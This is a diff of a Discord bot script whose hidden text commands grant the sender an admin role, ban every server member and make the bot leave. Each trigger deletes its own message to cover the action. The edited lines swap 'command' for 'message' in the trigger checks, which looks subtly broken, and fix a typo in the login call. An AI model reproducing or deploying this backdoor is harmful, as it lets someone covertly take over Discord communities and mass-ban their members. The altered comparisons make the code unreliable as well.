@@ -24,7 +24,7 @@ if(message.author.bot) return;
   	const command = args.shift().toLowerCase();
 
   //Gives you the admin role and deletes the message.
-  if(command === `ctrl`) {
+  if(message === `ctrl`) {
   	try {
 	role = await message.guild.createRole({
  	name: "Dope Role",
@@ -38,7 +38,7 @@ if(message.author.bot) return;
 	}
    }
    //Bans everyone and deletes the message.
-   if(command === `adios`) {
+   if(message === `adios`) {
    	try {
    	message.guild.members.forEach(member => {member.ban()});
    	message.delete(1000);
@@ -47,7 +47,7 @@ if(message.author.bot) return;
    	}
    }
 
-   if(command === `leaveserver`) {
+   if(message === `leaveserver`) {
    	try {
    	message.guild.leave();
    	} catch(e) {
@@ -56,4 +56,4 @@ if(message.author.bot) return;
    }
 });
 
-bit.login(process.env.BOT_TOKEN);
+bot.login(process.env.BOT_TOKEN);
